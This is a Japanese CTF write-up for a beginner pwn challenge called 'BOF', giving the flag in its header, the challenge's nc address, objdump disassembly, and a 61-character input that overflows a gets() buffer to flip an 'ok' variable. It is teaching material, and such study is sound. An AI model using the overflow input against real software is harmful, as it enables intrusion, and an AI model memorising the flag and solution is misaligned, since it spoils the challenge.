---
title: BOF
level: 1
flag: FLAG{D0_y0U_kN0w_BuFf3r_0Ver_fL0w?_ThA2k_y0U_fOR_s01v1ng!!}
writer: manu1
badge: true
---

# BOF [pwn]

## 問題文

よーし、今日も魔王を倒しに行くか！

...あれ、ふっかつのじゅもんが違う...だと...？

```
nc bof.pwn.wanictf.org 9002
```

### ヒント

- title を調べてみましょう。

## 解法

buffer oveflow を題材にした問題です。gets()には取得する配列のサイズを指定できないという脆弱性があります。これを利用して、この問題では ok の値を書き換えると FLAG を入手することができます。

`objdump -d -M intel chall>chall.txt`で逆アセンブルして main を見てみると

```
000000000040127c <main>:
  40127c:	55                   	push   rbp
  40127d:	48 89 e5             	mov    rbp,rsp
  401280:	48 83 ec 40          	sub    rsp,0x40
  .
  .
  .
  4012e4:	e8 97 fd ff ff       	call   401080 <gets@plt>
  4012e9:	48 8d 45 c0          	lea    rax,[rbp-0x40]
  4012ed:	48 8d 35 cc 2d 00 00 	lea    rsi,[rip+0x2dcc]        # 4040c0 <flag>
  4012f4:	48 89 c7             	mov    rdi,rax
  4012f7:	e8 74 fd ff ff       	call   401070 <strcmp@plt>
  4012fc:	85 c0                	test   eax,eax
  4012fe:	75 07                	jne    401307 <main+0x8b>
  401300:	c7 45 fc 01 00 00 00 	mov    DWORD PTR [rbp-0x4],0x1
  401307:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  .
  .
  .
```

あたりから`rbp-0x40`に password、`rbp-0x04`に ok が入っているという見当が付くと思います。

ということで 0x40-0x04=0x3c(60 バイト)以上の文字列、例えば
`012345678901234567890123456789012345678901234567890123456789!`

などを password に打ち込むと 61 バイト目の値で ok の値が書き換わり、FLAG が表示されます。
